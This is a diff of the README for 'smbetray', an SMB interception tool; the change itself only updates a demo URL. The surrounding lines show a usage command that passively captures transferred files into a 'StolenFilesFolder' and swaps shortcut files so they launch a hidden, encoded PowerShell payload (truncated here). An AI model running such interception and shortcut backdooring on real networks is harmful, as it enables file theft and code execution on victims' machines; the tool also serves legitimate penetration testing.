@@ -25,7 +25,7 @@ Then run smbetray with some attack modules
 	sudo ./smbetray.py --passive ./StolenFilesFolder --lnkSwapAll "powershell -noP -sta -w 1 -enc AABCAD....(etc)" -I eth0
 
 # Demo
-A demo of the tool can be found here: https://www.quickbreach.io/smbetray-backdooring-and-breaking-signatures/
+A demo of the tool can be found here: https://blog.quickbreach.io/smbetray-backdooring-and-breaking-signatures/
 
 # Features
 - Passively download any file sent over the wire in cleartext
